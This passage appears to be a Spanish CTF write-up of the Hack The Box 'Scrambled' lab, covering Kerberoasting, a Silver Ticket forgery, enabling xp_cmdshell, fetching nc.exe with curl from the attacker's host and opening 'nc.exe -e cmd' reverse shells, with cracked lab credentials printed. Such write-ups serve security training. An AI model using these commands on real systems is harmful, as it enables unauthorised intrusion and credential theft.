2024/10/01 14:27:40 >  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson
2024/10/01 14:27:40 >  Done! Tested 5 logins (1 successes) in 0.308 seconds

./kerbrute_linux_amd64 bruteuser --dc 10.10.11.168 -d scrm.local users khicks
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/01/24 - Ronnie Flathers @ropnop
2024/10/01 16:08:34 >  Using KDC(s):
2024/10/01 16:08:34 >   10.10.11.168:88
2024/10/01 16:08:34 >  Done! Tested 5 logins (0 successes) in 0.314 seconds

./kerbrute_linux_amd64 bruteuser --dc 10.10.11.168 -d scrm.local users sjenkins
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/01/24 - Ronnie Flathers @ropnop
2024/10/01 16:08:44 >  Using KDC(s):
2024/10/01 16:08:44 >   10.10.11.168:88
2024/10/01 16:08:44 >  Done! Tested 5 logins (0 successes) in 0.311 seconds
```
Muy bien, tenemos la contraseña para el usuario **ksimpson** del **servicio Kerberos**.

### Probando Contraseña de Usuario ksimpson con impacket-smbclient para Entrar a Servicio SMB vía Kerberos {#ksimpson}

La herramienta **smbclient** que se incluye en **impacket**, nos puede servir para autenticarnos en el **servicio SMB vía Kerberos**.

Vamos a probarlo con la contraseña que acabamos de encontrar, solo indica el dominio junto al usuario y contraseña y el servidor de dominio:
```bash
impacket-smbclient -k scrm.local/ksimpson:ksimpson@dc1.scrm.local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
Type help for list of commands
\#
```

Si escribimos `help`, veremos qué comandos podemos usar:
```bash
# help

 open {host,port=445} - opens a SMB connection against the target host/port
 login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
 kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
 login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
 logoff - logs off
 shares - list available shares
 use {sharename} - connect to an specific share
 cd {path} - changes the current directory to {path}
 lcd {path} - changes the current local directory to {path}
 pwd - shows current remote directory
 password - changes the user password, the new password will be prompted for input
 ls {wildcard} - lists all the files in the current directory
 lls {dirname} - lists all the files on the local filesystem.
 tree {filepath} - recursively lists all files in folder and sub folders
 rm {file} - removes the selected file
 mkdir {dirname} - creates the directory under the current path
 rmdir {dirname} - removes the directory under the current path
 put {filename} - uploads the filename into the current path
 get {filename} - downloads the filename from the current path
 mget {mask} - downloads all files from the current directory matching the provided mask
 cat {filename} - reads the filename from the current path
 mount {target,path} - creates a mount point from {path} to {target} (admin required)
 umount {path} - removes the mount point at {path} without deleting the directory (admin required)
 list_snapshots {path} - lists the vss snapshots for the specified path
 info - returns NetrServerInfo main results
 who - returns the sessions currently connected at the target host (admin required)
 close - closes the current SMB Session
 exit - terminates the server process (and this session)
```

Veamos los archivos compartidos:
```bash
# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL
```

Vemos varios, pero únicamente podremos entrar en el **directorio Public**.

Entremos para ver qué hay dentro:
```bash
# use Public
# ls
drw-rw-rw-          0  Thu Nov  4 16:23:19 2021 .
drw-rw-rw-          0  Thu Nov  4 16:23:19 2021 ..
-rw-rw-rw-     630106  Fri Nov  5 11:45:07 2021 Network Security Changes.pdf
```
Encontramos un PDF. 

Descarguémoslo y veamos si podemos encontrar algo en sus metadatos:
```bash
# get Network Security Changes.pdf
# exit
exiftool Network\ Security\ Changes.pdf
ExifTool Version Number         : 12.76
File Name                       : Network Security Changes.pdf
Directory                       : .
File Size                       : 630 kB
File Modification Date/Time     : 2024:10:02 16:52:23-06:00
File Access Date/Time           : 2024:10:02 16:52:24-06:00
File Inode Change Date/Time     : 2024:10:02 16:52:23-06:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Language                        : en-GB
Tagged PDF                      : Yes
Producer                        : Microsoft® Word 2010
Creator                         : Microsoft® Word 2010
Create Date                     : 2021:11:04 22:20:49+00:00
Modify Date                     : 2021:11:04 22:20:49+00:00
```
Nada útil.

Abramos el PDF para ver que es:

<p align="center">
<img src="/assets/images/htb-writeup-scrambled/Captura6.png">
</p>

Hay varios puntos que nos menciona y que son pistas sobre cómo avanzar de ahora en adelante.

* Primero: La **autenticación NTLM** se desactivó porque un atacante usó el **ataque NTLM Relay**, en toda la red interna no se puede usar esta autenticación.
* Segundo: Nos menciona que únicamente se pueden autenticar usando el **servicio Kerberos**, ya que piensan que no es posible hackearlo. Para autenticarse, necesitan el **dominio (scrm.local)**, su usuario y el nombre del servidor al que tengan acceso.
* Tercero: El atacante podía obtener las credenciales almacenadas de una base de datos de **SQL Server (MSSQL)** que usa su **software de HR**, por esto quitaron el acceso al **SQL Server**, menos a los administradores de red.

Ya con esto, nos podemos dar una idea de cómo proceder, que sería atacando el **servicio Kerberos**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Ataque Kerberoasting (Fallo en la Autenticación) {#kerberoasting}

Como ya tenemos un usuario y contraseña válido, podemos aplicar el **ataque Kerberoasting**. Este mismo ataque, ya lo hemos aplicado en la **máquina Active** para escalar privilegios.

Utilicemos la herramienta **GetUserSPNs.py de Impacket** para realizar el ataque.

Debemos indicar el dominio junto al usuario y contraseña, el servidor del dominio e indicar que es por **Kerberos**:
```bash
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 10:32:02.351452  2024-10-01 12:28:10.946619             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 10:32:02.351452  2024-10-01 12:28:10.946619
```

Hemos generado el ticket, ahora debemos obtener el hash del ticket generado, para esto debemos indicárselo con el parámetro `-request`:
```bash
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 10:32:02.351452  2024-10-01 12:28:10.946619             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 10:32:02.351452  2024-10-01 12:28:10.946619             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*...
...
...
```
Obtuvimos el hash e información extra como el **Service Principal Name (SPN)**, guardalo porque nos servira más adelante.

Muy bien, copia y pega el hash en un archivo para que podamos crackearlo con **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Pegasus60        (?)     
1g 0:00:00:04 DONE (2024-10-01 16:33) 0.2237g/s 2400Kp/s 2400Kc/s 2400KC/s Penrose..Pearce
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Tenemos la contraseña del **usuario sqlsvc** en texto claro y es claro que es para el **servicio MSSQL**.

Podemos comprobar si la contraseña funciona con la herramienta **impacket-mssqlclient**.

Debemos indicarle el dominio seguido del **usuario sqlsvc** junto a su contraseña y la IP de la máquina víctima:
```bash
impacket-mssqlclient scrm.local/sqlsvc:Pegasus60@10.10.11.168
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC1): Line 1: Login failed for user 'sqlsvc'.
```
No nos dejó loguearnos.

Vamos a usar el parámetro `-windows-auth` para tratar de evitar problemas con la autenticación de **Windows**:
```bash
impacket-mssqlclient scrm.local/sqlsvc:Pegasus60@10.10.11.168 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ("Unpacked data doesn't match constant value 'b'\\x14H\\x00\\x00\\x01\\x0ef\\x00'' should be ''NTLMSSP\\x00''", 'When unpacking field \' | "NTLMSSP\x00 | b\'\\x14H\\x00\\x00\\x01\\x0ef\\x00L\\x00o\\x00g\\x00i\\x00n\\x00 \\x00f\\x00a\\x00i\\x00l\\x00e\\x00d\\x00.\\x00 \\x00T\\x00h\\x00e\\x00 \\x00l\\x00o\\x00g\\x00i\\x00n\\x00 \\x00i\\x00s\\x00 \\x00f\\x00r\\x00o\\x00m\\x00 \\x00a\\x00n\\x00 \\x00u\\x00n\\x00t\\x00r\\x00u\\x00s\\x00t\\x00e\\x00d\\x00 \\x00d\\x00o\\x00m\\x00a\\x00i\\x00n\\x00 \\x00a\\x00n\\x00d\\x00 \\x00c\\x00a\\x00n\\x00n\\x00o\\x00t\\x00 \\x00b\\x00e\\x00 \\x00u\\x00s\\x00e\\x00d\\x00 \\x00w\\x00i\\x00t\\x00h\\x00 \\x00I\\x00n\\x00t\\x00e\\x00g\\x00r\\x00a\\x00t\\x00e\\x00d\\x00 \\x00a\\x00u\\x00t\\x00h\\x00e\\x00n\\x00t\\x00i\\x00c\\x00a\\x00t\\x00i\\x00o\\x00n\\x00.\\x00\\x03D\\x00C\\x001\\x00\\x00\\x01\\x00\\xfd\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\'[:8]\'')
```

Tampoco nos dejó y es por el hecho de que está desactivada la **autenticación NTLM**.

### Generando TGT para Autenticación en Servicio MSSQL vía Kerberos con impacket-getTGT (Fallo) {#ticketTGT}

Podemos intentar generar un **TGT** que nos sirva para autenticarnos en el **servicio Kerberos**. Esto lo realizaremos con la herramienta **impacket-getTGT**.

Solo hay que indicarle el dominio y el usuario con su contraseña:
```bash
impacket-getTGT scrm.local/sqlsvc:Pegasus60
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in sqlsvc.ccache
```

Exportamos el **archivo ccache** que se generó en la **variable de entorno KRB5CCNAME**:
```bash
export KRB5CCNAME=sqlsvc.ccache
```

E intentamos loguearnos:
```bash
impacket-mssqlclient dc1.scrm.local -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\sqlsvc'.
```
No nos dejo.

Intentemoslo con el **usuario ksimpson**:
```bash
impacket-getTGT scrm.local/ksimpson:ksimpson
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ksimpson.ccache
                                                                                                                                                                                                                 
export KRB5CCNAME=ksimpson.ccache

impacket-mssqlclient dc1.scrm.local -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\ksimpson'.
```

Nada tampoco, lo que seguiría es aplicar un **Silver Ticket Attack**.

### Aplicando Silver Ticket Attack y Conectandonos a Servicio MSSQL {#silver}

¿Qué es un **Silver Ticket Attack**?

| **Silver Ticket Attack** |
|:-----------:|
| *Un Silver Ticket Attack es un tipo de ataque dentro del ecosistema de Kerberos, un protocolo de autenticación ampliamente utilizado en entornos Windows para gestionar la autenticación de usuarios y servicios en una red. En este ataque, el atacante obtiene acceso no autorizado a servicios específicos mediante la creación de un "silver ticket" que es utilizado para autenticarse en un servicio Kerberizado.* | 

Acá te dejo un par de blogs con la explicación de este ataque:
* <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket" target="_blank">HackTricks: Silver Ticket</a>

* <a href="https://www.hackingarticles.in/domain-persistence-silver-ticket-attack/" target="_blank">Domain Persistence: Silver Ticket Attack</a>

En resumen, para aplicar este ataque necesitamos los siguientes datos:
* Un usuario y contraseña valido
* El SPN
* El NTLM Hash de la contraseña del usuario
* El SID del dominio
* El Dominio del AD
* Eñ servidor del dominio

Nosotros ya tenemos el usuario y contraseña válido, el SPN, el dominio del AD y el servidor del dominio.

Obtengamos el **NTLM Hash** de la contraseña del **usuario sqlsvc** con la siguiente página:
<a href="https://codebeautify.org/ntlm-hash-generator" target="_blank">NTLM Hash Generator</a>

Transfórmalo a minúscula:
```bash
echo "B999A..." | tr '[A-Z]' '[a-z]'
b999a...
```
Guarda este **NTLM Hash**.

Para obtener el **dominio SID**, vamos a ocupar la herramienta **impacket-getPac**. Debemos indicarle el administrador con `-targetUser`, luego el dominio y el usuario y contraseña:
```bash
impacket-getPac -targetUser Administrator scrm.local/sqlsvc:Pegasus60
KERB_VALIDATION_INFO 
LogonTime:                      
    dwLowDateTime:                   2462292332 
    dwHighDateTime:                  31134767 
...
...
EffectiveName:                   'administrator' 
FullName:                        '' 
LogonScript:                     '' 
ProfilePath:                     '' 
HomeDirectory:                   '' 
HomeDirectoryDrive:              '' 
LogonCount:                      258 
BadPasswordCount:                0 
UserId:                          500 
PrimaryGroupId:                  513 
GroupCount:                      5
...
...
ResourceGroupIds:               
    [
         
        RelativeId:                      572 
        Attributes:                      536870919 ,
    ] 
Domain SID: S-1-5-21-2743207045-1827831105-2542523200

 0000   10 00 00 00 CC C9 99 BE  FA D0 7B 05 CB 38 DC 63   ..........{..8.c
```
Ahí esta el **dominio SID** y con esto, ya tenemos los datos que necesitamos.

Apliquemos el ataque indicando todos los datos que pide:
```bash
impacket-ticketer -spn MSSQLSvc/dc1.scrm.local:1433 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -dc-ip dc1.scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05 -domain scrm.local Administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

Exportamos el **archivo ccache** a la **variable de entorno KRB5CCNAME** y nos logueamos al **servicio MSSQL**:
```bash
export KRB5CCNAME=Administrator.ccache
                                                                                                                                                                                                                 
impacket-mssqlclient dc1.scrm.local -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)> 
```

### Enumeración de Servicio MSSQL y Obteniendo Shell Interactiva {#MSSQL}

Estamos dentro del **servicio MSSQL** como administrador, vamos a empezar a enumerar lo que esté almacenado aquí.

Empecemos por las bases de datos, veamos si existen más:
```sql
SQL (SCRM\administrator  dbo@master)> SELECT name FROM master.sys.databases;
name         
----------   
master       

tempdb       

model        

msdb         

ScrambleHR
```

Bien, veamos las tablas de la base de datos **ScrambleHR**:
```sql
SQL (SCRM\administrator  dbo@master)> select table_name from ScrambleHR.information_schema.tables;
table_name   
----------   
Employees    

UserImport   

Timesheets
```

Hay solo 3 tablas, vamos a usar esa base de datos y veamos el contenido de estas:
```sql
SQL (SCRM\administrator  dbo@master)> use ScrambleHR;
ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR
INFO(DC1): Line 1: Changed database context to 'ScrambleHR'.

SQL (SCRM\administrator  dbo@ScrambleHR)> select * from Employees;
EmployeeID   FirstName   Surname   Title   Manager   Role   
----------   ---------   -------   -----   -------   ----   

SQL (SCRM\administrator  dbo@ScrambleHR)> select * from UserImport;
LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   
--------   -----------------   ----------   ---------------   -------------   
MiscSvc    ScrambledEggs9900   scrm.local                90               0   

SQL (SCRM\administrator  dbo@ScrambleHR)> select * from Timesheets;
EmployeeID   TimeStart   TimeEnd   
----------   ---------   -------
```

Encontramos la contraseña de un usuario llamado **MiscSvc** y está en texto claro, parece que menciona que es el usuario y contraseña del **servicio LDAP**, pero seguramente sirve para otros servicios.

Guárdala, ya que la usaremos más adelante.

Obtengamos una shell interactiva. Para hacer esto, podríamos cargar un binario de **netcat** al directorio **/Temp** de la máquina víctima y después indicarle que ejecute una cmd en una **netcat** que levantemos.

Para realizar esto, vamos a usar la herramienta **xp_cmdshell** que tiene el **servicio MSSQL**.

| **xp_cmdshell** |
|:-----------:|
| *xp_cmdshell es una función extendida de SQL Server que permite ejecutar comandos del sistema operativo directamente desde una consulta SQL. Está diseñado para realizar tareas administrativas ejecutando scripts, programas, o cualquier otro comando de línea de comandos desde el servidor de SQL Server.* |

#### Activando xp_cmdshell en Servicio MSSQL {#xpcmd}

Revisemos si está activa:
```sql
SQL (SCRM\administrator  dbo@ScrambleHR)> xp_cmdshell "whoami"
ERROR(DC1): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

No lo está, tenemos 2 formas de activarla:

* Activandola con el comando `enable xp_cmdshell`:
```sql
SQL (SCRM\administrator  dbo@master)> enable_xp_cmdshell
INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SCRM\administrator  dbo@master)> xp_cmdshell "whoami"
output        
-----------   
scrm\sqlsvc   
NULL
```

* Activando de forma manual de la siguiente manera:
```sql
SQL (SCRM\administrator  dbo@master)> SP_CONFIGURE "show advanced options", 1;
INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SCRM\administrator  dbo@master)> RECONFIGURE;
SQL (SCRM\administrator  dbo@master)> SP_CONFIGURE "xp_cmdshell", 1;
INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SCRM\administrator  dbo@master)> RECONFIGURE;
```

* Y ya podemos ejecutar comandos como si fuera una **cmd**:
```sql
SQL (SCRM\administrator  dbo@master)> xp_cmdshell "whoami"
output        
-----------   
scrm\sqlsvc   
NULL
```

Continuemos.

#### Obteniendo Shell con Binario nc.exe {#binarioNC}

Comprueba que la máquina tenga la herramienta **curl**:
```sql
SQL (SCRM\administrator  dbo@master)> xp_cmdshell "curl"
output                                         
--------------------------------------------   
curl: try 'curl --help' for more information   

NULL
```

**Kali Linux** y **SecLists** tienen un binario de **netcat**:
```bash
locate nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
```

Cópialo en tu directorio de trabajo y abre un servidor en **Python**:
```bash
cp /usr/share/windows-resources/binaries/nc.exe .

python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Carguemos el binario a la máquina en el **directorio /Temp**:
```sql
SQL (SCRM\administrator  dbo@master)> xp_cmdshell "curl Tu_IP/nc.exe -o C:\Temp\nc.exe"
output                                                                             
--------------------------------------------------------------------------------   
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current    

                                 Dload  Upload   Total   Spent    Left  Speed      
100 59392  100 59392    0     0   194k      0 --:--:-- --:--:-- --:--:--  194k   

NULL
```

Abre una sesión de **netcat**, pero usando **rlwrap** (muy útil para **Windows**):
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Y desde la sesión de **MSSQL**, usemos el binario de **netcat** para obtener una **cmd**:
```sql
SQL (SCRM\administrator  dbo@master)> xp_cmdshell "C:\Temp\nc.exe -e cmd Tu_IP 443"
```

Listo, tenemos una sesión interactiva:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.168] 58119
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
scrm\sqlsvc
```

Genial, pero este usuario no tiene la flag, pues existe el **usuario MiscSvc** y es a quien debemos llegar para obtener la primera flag.

## Post Explotación {#Post}

### Aplicando User Pivoting para Convertirnos en Usuario MiscSvc {#Pivot}

Actualmente, somos el **usuario sqlsvc** y por lo que sabemos existe un usuario llamado **MiscSvc**, cómo ya tenemos su contraseña, solamente debemos pivotear a su cuenta.

Tenemos 3 formas de realizar este proceso:
* **Evil-WinRM** autenticándonos vía **Kerberos**.
* Ocupando **Script-Blocks e Invoke-Command usando PowerShell**.
* Utilizando **Enter-PSSession de PowerShell** para obtener una sesión como **MiscSvc**.

Vamos a aplicarlas todas.

#### Utilizando Evil-WinRM para Autenticarnos como Usuario MiscSvc vía Kerberos {#evilWinRM}

Para realizar este proceso, es necesario que tengas el archivo `/etc/krb5.conf`, si no lo tienes, lo puedes obtener de la siguiente manera:
```bash
apt install krb5-user krb5-config
```

Y te preguntarás, ¿para qué necesitamos este archivo?

| **Archivo krb5.conf** |
|:-----------:|
| *El archivo /etc/krb5.conf es el archivo de configuración principal para Kerberos en sistemas basados en Linux, como Kali Linux. Este archivo define la configuración de Kerberos 5 (la versión más común del protocolo) en tu sistema y especifica los parámetros necesarios para que el cliente Kerberos pueda interactuar con un Key Distribution Center (KDC) y otros servicios Kerberos.* |

Este archivo contiene las siguientes configuraciones:

| Configuración    | Descripción |
|---|---|
| *[libdefaults]*  | Configuraciones generales del cliente Kerberos, como el nombre del reino (realm) y el tipo de cifrado predeterminado. |
| *[realms]*       | Define los diferentes reinos (realms) Kerberos, incluyendo los servidores KDC y el servidor de administración Kerberos para ese reino. |
| *[domain_realm]* | Mapeo entre dominios DNS y reinos Kerberos. |
| *[logging]*      | Configura cómo y dónde se registran los logs de Kerberos (archivo, syslog, etc.). |

Creo que queda claro para qué es este archivo.

Una vez que lo tengas, vamos a modificarlo para agregarle el dominio del **servicio Kerberos** de la máquina víctima:
```bash
[libdefaults]
        default_realm = SCRM.LOCAL

# The following libdefaults parameters are only for Heimdal Kerberos.
        fcc-mit-ticketflags = true

[realms]
        SCRM.LOCAL = {
                kdc = dc1.scrm.local
        }

[domain_realm]
        .scrm.local = SCRM.LOCAL
        scrm.local = SCRM.LOCAL
```

Y también debes de configurar el **Evil-WinRM** para agregarle la característica **remote path completion**, para este paso debes verificar tu versión de **Ruby** y seguir los pasos que indica el **GitHub** de esta herramienta (OJO, debes seguir los pasos con base en tu versión de **Ruby**):
* <a href="https://github.com/Hackplayers/evil-winrm#Remote-path-completion" target="_blank">Repositorio de Hackplayers: evil-winrm - Remote path completion</a>

Es posible que te salga un error sobre un archivo llamado **ffi**. Esta es una librería de **Ruby** que a lo mejor tienes, pero que por X o Y motivo no está funcionando correctamente. (Si no te sale este error, continúa con lo demás)

Para solucionarlo, aplica los siguientes comandos:
```bash
gem uninstall ffi
gem install ffi --platform=ruby
apt-get install build-essential libffi-dev
```

Una vez que tengas todo configurado, tan solo hay que crear un **TGT** usando al **usuario MiscSvc**, exportar el **archivo ccache** a la variable de entorno y autenticarnos con **Evil-WinRM**:
```bash
impacket-getTGT scrm.local/MiscSvc:ScrambledEggs9900
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] Saving ticket in MiscSvc.ccache
                                                                                                                                                                                                                 
export KRB5CCNAME=MiscSvc.ccache

evil-winrm -r SCRM.LOCAL -i dc1.scrm.local
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\miscsvc\Documents> whoami
scrm\miscsvc
```

#### Utilizando Script-Blocks y cmdlet Invoke-Command de PowerShell para Obtener Shell como Usuario MiscSvc {#blocks}

Como ya tenemos una sesión interactiva, podemos probar a entrar en **PowerShell** y aplicar **Script-Blocks e Invoke-Command** con tal de obtener una sesión como el **usuario MiscSvc** usando el binario **netcat** que ya tenemos aquí.

| **Script Blocks en PowerShell** |
|:-----------:|
| *En el contexto de PowerShell, los script blocks son secciones de código o un grupo de comandos que se encapsulan dentro de llaves {}. Un script block permite que un conjunto de comandos se defina y se ejecute en un momento posterior, o que se pase como argumento a otras funciones o cmdlets.* |

Sintaxis:
```batch
# Forma 1:
$myScriptBlock = {
    Get-Process
    Write-Output "Procesos listados."
}
$myScriptBlock

# Forma 2:
$myScriptBlock = Get-Process Write-Output "Procesos listados."
$myScriptBlock
```

| **Cmdlet Invoke-Command** |
|:-----------:|
| *Invoke-Command es un cmdlet de PowerShell que permite ejecutar comandos en máquinas locales o remotas. Este cmdlet es particularmente útil para la administración remota, permitiendo a los administradores ejecutar comandos en varias máquinas sin necesidad de acceder físicamente a ellas.* |

Sintaxis:
```batch
Invoke-Command -ComputerName "RemoteMachine" -ScriptBlock { Get-Process }

Invoke-Command -ComputerName "RemoteMachine" -ScriptBlock { Get-Service } -Credential (Get-Credential)
```

* *Parámetro -ComputerName*: Especifica el nombre o dirección IP de la máquina remota.
* *Parámetro -ScriptBlock*: Define el bloque de código que se ejecutará en la máquina remota.
* *Ejecución local*: Si no se especifica -ComputerName, el comando se ejecutará en la máquina local.
* *Parámetro -Credential*: Si necesitas ejecutar el comando en una máquina que requiere credenciales específicas, usa este parámetro para proporcionar el usuario y contraseña.

Vamos a hacerlo por pasos:

* Preparamos entorno y activamos **PowerShell**:

```batch
C:\Temp>mkdir Privesc
mkdir Privesc

C:\Temp>cd Privesc
cd Privesc

C:\Temp\Privesc>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Temp\Privesc>
```

* Creamos el **Script-Block** que almacene al usuario:
```batch
PS C:\Temp\Privesc> $user = 'scrm.local\MiscSvc'
$user = 'scrm.local\MiscSvc'
```

* Creamos el **Script-Block** que almacene la contraseña del usuario:
```batch
PS C:\Temp\Privesc> $password = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
$password = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force
```

* Creamos el **Script-Block** que almacene un objeto que reproduce el usuario y contraseña:
```batch
PS C:\Temp\Privesc> $cred = New-Object System.Management.Automation.PSCredential($user, $password)
$cred = New-Object System.Management.Automation.PSCredential($user, $password)
```

* Usamos el cmdlet `Invoke-Command` junto a los **Script-Blocks** para ejecutar comandos como **usuario MiscSvc**:
```batch
PS C:\Temp\Privesc> Invoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock { whoami }
Invoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock { whoami }
scrm\miscsvc
```

Ya podemos ejecutar comandos como **MiscSvc**, ya solo debemos obtener una sesión como este usuario:

* Abre una **netcat** con **rlwrap**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

* Ejecuta el binario de **netcat** para obtener la shell de **MiscSvc**:
```batch
PS C:\Temp\Privesc> Invoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock { C:\Temp\nc.exe -e cmd Tu_IP 443 }
Invoke-Command -ComputerName DC1 -Credential $cred -ScriptBlock { C:\Temp\nc.exe -e cmd Tu_IP 443 }
```

* Revisa la **netcat**:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.168] 58708
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\miscsvc\Documents>whoami
whoami
scrm\miscsvc
```
Listo.

#### Utilizando cmdlet Enter-PSSession para Obtener Sesión en PowerShell como Usuario MiscSvc (Fallo para Mi) {#PSSesion}

Para realizar este paso, necesitamos configurar el `/etc/krb5.conf` del mismo modo que hicimos con la forma de **Evil-WinRM**.

También debes tener **PowerShell** en tu máquina, en **Kali** ya está instalado por defecto.

Abrimos **PowerShell** y usamos el **cmdlet Enter-PSSession**. Debemos indicarle el dominio y el usuario para que nos pida la contraseña:
```bash
pwsh
PowerShell 7.2.6
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS ../Scrambled/OSCP_Style/content> Enter-PSSession -ComputerName dc1.scrm.local -Credential MiscSvc      
PowerShell credential request
Enter your credentials.                                                                                
Password for user MiscSvc: *****************

Enter-PSSession: This parameter set requires WSMan, and no supported WSMan client library was found. WSMan is either not installed or unavailable for this system.
```

Nos pide que instalemos la **librería WSMan**. Puedes encontrar los pasos para instalarla aquí:
* <a href="https://github.com/jborean93/omi" target="_blank">Repositorio de jborean93: omi</a>

